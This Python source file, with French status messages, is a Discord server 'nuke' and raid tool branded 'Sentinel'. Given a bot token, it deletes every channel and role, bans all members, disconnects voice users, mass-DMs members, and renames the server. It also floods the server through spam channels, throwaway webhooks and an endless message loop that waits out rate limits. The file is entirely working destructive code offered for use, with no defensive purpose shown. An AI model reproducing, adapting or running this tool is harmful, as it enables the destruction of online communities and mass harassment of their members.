# -*- coding: utf-8 -*-
import asyncio
import aiohttp
import discord
import os
from colorama import Fore

async def webhook_spam_url(url: str, message: str, count: int):
    if not url: return
    async with aiohttp.ClientSession() as session:
        tasks = [session.post(url, json={"content": message, "tts": False}) for _ in range(count)]
        await asyncio.gather(*tasks, return_exceptions=True)
    print(Fore.GREEN + f"\n[+] {count} messages webhook envoyés avec succès.")

async def delete_all_channels(guild):
    print(Fore.YELLOW + "\n[*] Suppression des salons en cours...")
    for ch in guild.channels:
        try: await ch.delete()
        except: pass
    print(Fore.RED + "[-] Tous les salons ont été supprimés.")

async def delete_all_roles(guild):
    print(Fore.YELLOW + "\n[*] Suppression des rôles en cours...")
    for role in guild.roles:
        if role.is_default() or role.managed: continue
        try: await role.delete()
        except: pass
    print(Fore.RED + "[-] Tous les rôles ont été supprimés.")

async def create_spam_channels(guild, message: str, n: int, prefix: str = "nuked"):
    print(Fore.YELLOW + f"\n[*] Création de {n} salons...")
    for i in range(n):
        try:
            ch = await guild.create_text_channel(f"{prefix}-{i}")
            await ch.send(message)
        except: pass
    print(Fore.GREEN + f"[+] {n} salons '{prefix}' créés et spamés.")

async def create_roles(guild, n: int, prefix: str = "nuked"):
    print(Fore.YELLOW + f"\n[*] Création de {n} rôles...")
    for i in range(n):
        try: await guild.create_role(name=f"{prefix}-{i}", colour=discord.Colour.random())
        except: pass
    print(Fore.GREEN + f"[+] {n} rôles '{prefix}' créés.")

async def spam_existing_channels(guild, message: str, count: int):
    print(Fore.YELLOW + f"\n[*] Envoi de {count} messages par salon...")
    for ch in guild.text_channels:
        for _ in range(count):
            try: await ch.send(message)
            except: pass
    print(Fore.GREEN + f"[+] Spam terminé dans tous les salons.")

async def dm_all(guild, message: str):
    print(Fore.YELLOW + "\n[*] Envoi des DM en cours...")
    count = 0
    for member in guild.members:
        if member.bot: continue
        try:
            formatted_msg = message.replace("{user}", member.mention)
            await member.send(formatted_msg)
            count += 1
            await asyncio.sleep(0.5) 
        except: pass
    print(Fore.GREEN + f"[+] DM envoyés à {count} membres.")

async def ban_all(guild):
    print(Fore.YELLOW + "\n[*] Bannissement de masse en cours...")
    count = 0
    for member in guild.members:
        if member.bot or member == guild.owner: continue
        try:
            await member.ban(reason="Nuke")
            count += 1
        except: pass
    print(Fore.RED + f"[-] {count} membres bannis.")

async def voice_disconnect_all(guild):
    print(Fore.YELLOW + "\n[*] Déconnexion des membres vocaux en cours...")
    count = 0
    for vc in guild.voice_channels:
        for member in vc.members:
            try:
                await member.move_to(None)
                count += 1
                await asyncio.sleep(0.1) 
            except: pass
    print(Fore.GREEN + f"[+] {count} membres déconnectés des salons vocaux.")

async def webhook_mass_spam(guild, message: str, count: int):
    print(Fore.YELLOW + "\n[*] Déploiement des webhooks et spam massif...")
    webhooks = []
    for ch in guild.text_channels:
        try:
            wh = await ch.create_webhook(name="Sentinel")
            webhooks.append(wh)
        except: pass
    
    async with aiohttp.ClientSession() as session:
        for wh in webhooks:
            try:
                tasks = [session.post(wh.url, json={"content": message, "tts": False}) for _ in range(count)]
                await asyncio.gather(*tasks, return_exceptions=True)
            except: pass
            
    for wh in webhooks:
        try: await wh.delete()
        except: pass
        
    print(Fore.GREEN + f"[+] {len(webhooks)} webhooks ont spam le serveur puis ont été supprimés.")

async def change_server_info(guild, new_name: str, icon_path: str = None):
    print(Fore.YELLOW + f"\n[*] Modification des infos du serveur...")
    try:
        await guild.edit(name=new_name)
        print(Fore.GREEN + f"[+] Nom du serveur changé en : {new_name}")
        
        if icon_path and os.path.exists(icon_path):
            with open(icon_path, "rb") as image:
                icon_bytes = image.read()
            await guild.edit(icon=icon_bytes)
            print(Fore.GREEN + f"[+] Icône du serveur modifiée.")
    except Exception as e:
        print(Fore.RED + f"[X] Impossible de modifier le serveur : {e}")

async def _do_raid(guild, cfg):
    n_ch = cfg.get("nuke_channels", 10)
    n_ro = cfg.get("nuke_roles", 20)
    prefix = cfg.get("name_prefix", "nuked")
    await delete_all_channels(guild)
    await create_spam_channels(guild, cfg["message"], n_ch, prefix)
    await create_roles(guild, n_ro, prefix)

async def _do_nuke(guild, cfg):
    n_ch = cfg.get("nuke_channels", 15)
    n_ro = cfg.get("nuke_roles", 30)
    prefix = cfg.get("name_prefix", "nuked")
    
    # Changement d'identité du serveur
    await change_server_info(guild, "Nuked by Sentinel", "icon.png")
    
    await delete_all_channels(guild)
    await delete_all_roles(guild)
    await create_spam_channels(guild, cfg["message"], n_ch, prefix)
    await create_roles(guild, n_ro, prefix)
    
    print(Fore.RED + "\n[!] DÉBUT DU SPAM INFINI MASSIF (CTRL+C pour arrêter)")
    
    async def spam_channel(ch):
        while True:
            try:
                await asyncio.gather(*[ch.send(cfg["message"]) for _ in range(5)])
            except discord.errors.HTTPException as e:
                if e.status == 429: await asyncio.sleep(1) 
            except: await asyncio.sleep(1)

    channels = guild.text_channels
    tasks = [asyncio.create_task(spam_channel(ch)) for ch in channels]
    await asyncio.gather(*tasks)

async def run_client_action(cfg: dict, action_func, *args):
    intents = discord.Intents.all()
    client = discord.Client(intents=intents)
    done_event = asyncio.Event()

    @client.event
    async def on_ready():
        print(Fore.CYAN + f"\n[*] Connecté en tant que : {client.user}")
        guild = client.get_guild(cfg["guild_id"])
        if guild:
            await action_func(guild, *args)
        else:
            print(Fore.RED + "[X] Serveur introuvable (Vérifie l'ID).")
        done_event.set()

    try:
        run_task = asyncio.create_task(client.start(cfg["token"]))
        await done_event.wait()
    except Exception as e:
        print(Fore.RED + f"[X] Erreur client : {e}")
    finally:
        if not client.is_closed(): await client.close()
        try: await asyncio.wait_for(run_task, timeout=2)
        except: run_task.cancel()

async def execute_action(cfg: dict, action_name: str, arg1=None, arg2=None):
    if cfg["mode"] == "webhook" and action_name not in ["webhook_mass"]:
        await webhook_spam_url(cfg["webhook"], cfg["message"], cfg.get("spam_count", 10))
        return

    mapping = {
        "delete_channels": (delete_all_channels, ()),
        "delete_roles": (delete_all_roles, ()),
        "create_channels": (create_spam_channels, (cfg["message"], arg1 or 10, arg2 or "nuked")),
        "create_roles": (create_roles, (arg1 or 10, arg2 or "nuked")),
        "dm_all": (dm_all, (cfg["message"],)),
        "ban_all": (ban_all, ()),
        "spam": (spam_existing_channels, (cfg["message"], cfg.get("spam_count", 10))),
        "voice_kick": (voice_disconnect_all, ()),
        "webhook_mass": (webhook_mass_spam, (cfg["message"], cfg.get("spam_count", 5))),
        "raid": (None, ()),
        "nuke": (None, ())
    }

    if action_name == "raid":
        await run_client_action(cfg, _do_raid, cfg)
    elif action_name == "nuke":
        await run_client_action(cfg, _do_nuke, cfg)
    else:
        func, args = mapping[action_name]
        await run_client_action(cfg, func, *args)

    if cfg.get("webhook") and action_name in ["raid", "nuke", "spam"]:
        await webhook_spam_url(cfg["webhook"], cfg["message"], cfg.get("spam_count", 10))
